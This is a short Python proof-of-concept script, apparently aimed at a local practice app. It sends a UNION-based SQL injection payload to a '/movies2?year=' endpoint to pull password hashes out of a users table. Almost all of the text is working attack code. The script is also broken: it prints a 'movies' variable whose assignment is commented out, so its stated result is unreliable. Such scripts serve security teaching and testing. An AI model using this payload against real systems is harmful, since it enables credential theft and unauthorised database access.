import requests

# Craft a malicious payload
payload = "2020"

payload += "' UNION SELECT password_hash FROM users;--"

# Make a GET request to the vulnerable endpoint
response = requests.get("http://localhost:5000/movies2?year=" + payload)

# Extract the results (assuming the response is in JSON format)
data = response.json()
# movies = data['movies']

# The 'movies' list will now contain the extracted password hashes
print(movies)
